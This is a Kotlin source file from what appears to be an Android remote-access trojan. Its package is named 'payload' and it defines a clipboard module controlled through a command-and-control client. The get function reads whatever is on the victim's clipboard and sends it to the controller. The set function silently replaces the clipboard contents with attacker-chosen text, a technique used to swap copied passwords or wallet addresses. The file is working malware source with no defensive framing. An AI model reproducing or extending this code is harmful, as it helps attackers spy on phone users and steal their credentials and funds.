package com.ihk909.payload.modules

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.os.Handler
import android.os.Looper
import com.ihk909.payload.C2Client
import org.json.JSONObject

object ClipModule {
    private val ui = Handler(Looper.getMainLooper())

    fun get(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        ui.post {
            runCatching {
                val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                val d = cm.primaryClip
                val text = if (d != null && d.itemCount > 0)
                    d.getItemAt(0).coerceToText(ctx).toString() else ""
                c2.reply(id, JSONObject().put("text", text))
            }.onFailure { c2.replyError(id, it.message ?: "error") }
        }
    }

    fun set(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        ui.post {
            runCatching {
                val text = args.optString("text", "")
                val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                cm.setPrimaryClip(ClipData.newPlainText("x", text))
                c2.reply(id, JSONObject().put("set", true))
            }.onFailure { c2.replyError(id, it.message ?: "error") }
        }
    }
}